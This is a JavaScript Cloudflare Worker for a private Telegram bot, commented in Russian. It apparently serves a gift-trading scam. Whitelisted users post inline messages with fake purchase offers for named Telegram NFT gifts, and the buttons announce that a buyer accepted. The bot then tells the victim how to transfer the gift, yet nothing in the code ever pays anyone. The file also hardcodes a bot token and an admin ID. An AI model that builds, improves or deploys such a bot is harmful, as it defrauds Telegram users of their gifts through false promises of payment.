const ADMIN_ID = 5151757168; // Ваш ID
const BOT_TOKEN = "9231998177:AAEFkqiFf9ihgkzjBk-DJJSoeyh149pUmew"; // ВСТАВЬТЕ ВАШ ТОКЕН!

export default {
  async fetch(request, env, ctx) {
    if (request.method !== "POST") {
      return new Response("OK", { status: 200 });
    }

    try {
      const update = await request.json();
      
      // БЕЗОПАСНОЕ ПОДКЛЮЧЕНИЕ К БАЗЕ
      const kv = env.USERS_KV;
      if (!kv) {
        console.error("ВНИМАНИЕ: База данных USERS_KV не привязана в Cloudflare!");
      }

      // --- ОБРАБОТКА КОМАНДЫ /start ---
      if (update.message && update.message.text === "/start") {
        const chatId = update.message.chat.id;
        const userId = update.message.from.id;
        const username = update.message.from.username;

        // Безопасно сохраняем юзернейм
        if (username && kv) {
          await kv.put(`username:${username.toLowerCase()}`, userId.toString());
        }

        const isAdmin = userId === ADMIN_ID;
        let isAllowed = false;
        
        // Безопасно проверяем доступ
        if (kv) {
          isAllowed = await kv.get(`user:${userId}`);
        }
        
        let text = "";
        if (!isAdmin && !isAllowed) {
          text = "🔒 <b>Доступ закрыт.</b>\n\nЭтот бот приватный.\nОбратитесь к владельцу (@gwrex).\n\nВаш ID: <code>" + userId + "</code>";
        } else {
          text = `🎁 <b>NFT OFFER BOT</b> ||\n\n✅ <b>Пользователь · Gift</b>\n🆔 <b>Ваш ID:</b> <code>${userId}</code>\n⏳ <b>Доступ:</b> ∞ бессрочно\n\nОткрой чат и напиши:\n<code>@GarisOfferBot t.me/nft/ViceCream-355398 300 stars</code>`;
        }

        await callApi("sendMessage", { chat_id: chatId, text: text, parse_mode: "HTML" });
      }

      // --- ОБРАБОТКА КОМАНДЫ /add (только для вас) ---
      if (update.message && update.message.text.startsWith("/add ")) {
        const senderId = update.message.from.id;
        
        if (senderId === ADMIN_ID) {
          if (!kv) {
            await callApi("sendMessage", { chat_id: ADMIN_ID, text: "❌ <b>Ошибка:</b> База данных KV не подключена в Cloudflare!" });
            return new Response("OK", { status: 200 });
          }

          let target = update.message.text.split(" ")[1].trim();
          
          if (target.startsWith("@")) {
            const uname = target.slice(1).toLowerCase();
            const foundId = await kv.get(`username:${uname}`);
            
            if (foundId) {
              await kv.put(`user:${foundId}`, "true");
              await callApi("sendMessage", { chat_id: ADMIN_ID, text: `✅ Пользователь <b>@${uname}</b> добавлен.` });
            } else {
              await callApi("sendMessage", { chat_id: ADMIN_ID, text: `⚠️ Пользователь <b>@${uname}</b> не найден в базе.\n\nПопросите его нажать /start в боте, после чего вы сможете его добавить.` });
            }
          } else {
            await kv.put(`user:${target}`, "true");
            await callApi("sendMessage", { chat_id: ADMIN_ID, text: `✅ Пользователь с ID <code>${target}</code> добавлен.` });
          }
        }
      }

      // --- ОБРАБОТКА INLINE-ЗАПРОСОВ ---
      if (update.inline_query) {
        const iq = update.inline_query;
        const userId = iq.from.id;
        
        const isAdmin = userId === ADMIN_ID;
        let isAllowed = false;
        if (kv) {
          isAllowed = await kv.get(`user:${userId}`);
        }

        if (!isAdmin && !isAllowed) {
            return new Response("OK", { status: 200 });
        }

        const parts = iq.query.split(" ");
        if (parts.length >= 3) {
          const giftId = parts[0];
          const amount = parts[1];
          const currency = parts[2];

          let senderName = iq.from.first_name || "";
          if (iq.from.last_name) senderName += " " + iq.from.last_name;
          if (!senderName && iq.from.username) senderName = "@" + iq.from.username;

          const text = `🎁 <b>${giftId}</b>\n\n👤 <b>${senderName}</b> предлагает вам ${amount} ⭐ Stars за подарок ${giftId}.\n\nОффер действителен ещё 5 ч. 59 мин..`;

          const results = [{
            type: "article",
            id: "1",
            title: `Оффер: ${giftId}`,
            description: `За ${amount} ${currency}`,
            input_message_content: { message_text: text, parse_mode: "HTML" },
            reply_markup: {
              inline_keyboard: [
                [{ text: "✅ Принять", callback_data: "accept_offer" }],
                [{ text: "❌ Отклонить", callback_data: "decline_offer" }]
              ]
            }
          }];

          await callApi("answerInlineQuery", { inline_query_id: iq.id, results: results, cache_time: 0 });
        }
      }

      // --- ОБРАБОТКА НАЖАТИЙ НА КНОПКИ ---
      if (update.callback_query) {
        const cq = update.callback_query;
        const data = cq.data;
        const chatId = cq.message.chat.id;
        const messageId = cq.message.message_id;

        if (data === "accept_offer") {
          const newText = "✓ <b>MarketRedo Скуп НФТ принял оффер!</b>\n\nПодарок продан!\nПередайте подарок для зачисления 300 ⭐ Stars";
          const newMarkup = { inline_keyboard: [[{ text: "🔄 Передать подарок", callback_data: "transfer_gift" }]] };
          await callApi("editMessageText", { chat_id: chatId, message_id: messageId, text: newText, parse_mode: "HTML", reply_markup: newMarkup });
          await callApi("answerCallbackQuery", { callback_query_id: cq.id });
        } 
        else if (data === "decline_offer") {
          const newText = "× <b>MarketRedo Скуп НФТ отклонил оффер</b>";
          await callApi("editMessageText", { chat_id: chatId, message_id: messageId, text: newText, parse_mode: "HTML", reply_markup: { inline_keyboard: [] } });
          await callApi("answerCallbackQuery", { callback_query_id: cq.id });
        } 
        else if (data === "transfer_gift") {
          const alertText = "Инструкция по передаче:\n1. Откройте профиль Telegram → «Подарки»\n2. Выберите подарок → «Передать»\n3. Укажите покупателя и отправьте\n\n⚡ Средства будут зачислены сразу после передачи!";
          await callApi("answerCallbackQuery", { callback_query_id: cq.id, text: alertText, show_alert: true });
        }
      }

      return new Response("OK", { status: 200 });
    } catch (error) {
      console.error("КРИТИЧЕСКАЯ ОШИБКА:", error.message);
      return new Response("Error: " + error.message, { status: 500 });
    }
  }
};

async function callApi(method, body) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
  const response = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body)
  });
  return response.json();
}